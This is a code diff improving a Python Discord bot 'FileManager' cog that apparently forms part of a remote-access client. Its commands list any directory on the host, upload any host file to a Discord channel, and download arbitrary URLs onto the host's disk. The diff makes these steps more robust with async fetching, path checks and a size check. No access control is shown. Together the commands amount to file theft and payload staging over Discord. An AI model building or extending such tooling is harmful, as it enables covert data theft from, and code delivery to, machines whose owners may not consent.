@@ -1,6 +1,6 @@
 import os
 import shutil
-import requests
+import aiohttp
 import discord
 from discord.ext import commands
 from src.client.core.platform import Platform
@@ -12,14 +12,21 @@ class FileManager(commands.Cog):
     @commands.command(name="ls", help="List files in the current directory.")
     async def list_files(self, ctx, path="."):
         try:
-            files = os.listdir(path)
+            # Ensure we use an absolute path for listing if provided
+            target_path = os.path.abspath(path)
+            if not os.path.exists(target_path):
+                 await ctx.send(f"❌ Path not found: `{path}`")
+                 return
+
+            files = os.listdir(target_path)
             if not files:
-                await ctx.send("📁 Directory is empty.")
+                await ctx.send(f"📁 Directory is empty: `{target_path}`")
                 return
             
-            output = f"📁 **Directory listing for `{os.path.abspath(path)}`**\n"
+            output = f"📁 **Directory listing for `{target_path}`**\n"
             for f in files:
-                prefix = "📁" if os.path.isdir(os.path.join(path, f)) else "📄"
+                is_dir = os.path.isdir(os.path.join(target_path, f))
+                prefix = "📁" if is_dir else "📄"
                 output += f"{prefix} {f}\n"
             
             if len(output) > 1900:
@@ -39,9 +46,16 @@ class FileManager(commands.Cog):
             await ctx.send(f"❌ File not found: `{file_path}`")
             return
         
+        if os.path.isdir(file_path):
+             await ctx.send(f"❌ `{file_path}` is a directory. Please specify a file.")
+             return
+
         try:
-            # Discord has a file size limit (8MB/25MB/50MB depending on server/boost)
-            # We'll try to send it and catch if it's too big
+            file_size = os.path.getsize(file_path)
+            if file_size > 25 * 1024 * 1024: # 25MB limit
+                await ctx.send(f"⚠️ File is too large ({file_size / 1024 / 1024:.2f}MB). Discord limit is 25MB.")
+                return
+
             await ctx.send(f"📤 Uploading `{os.path.basename(file_path)}`...")
             await ctx.send(file=discord.File(file_path))
         except Exception as e:
@@ -51,12 +65,15 @@ class FileManager(commands.Cog):
     async def download(self, ctx, url, filename):
         try:
             await ctx.send(f"📥 Downloading `{filename}` from URL...")
-            response = requests.get(url, stream=True)
-            with open(filename, 'wb') as f:
-                for chunk in response.iter_content(chunk_size=8192):
-                    if chunk:
-                        f.write(chunk)
-            await ctx.send(f"✅ Download complete: `{os.path.abspath(filename)}`")
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, timeout=30) as response:
+                    if response.status == 200:
+                        content = await response.read()
+                        with open(filename, 'wb') as f:
+                            f.write(content)
+                        await ctx.send(f"✅ Download complete: `{os.path.abspath(filename)}`")
+                    else:
+                        await ctx.send(f"❌ Download failed with status: {response.status}")
         except Exception as e:
             await ctx.send(f"❌ Download Error: {str(e)}")
 
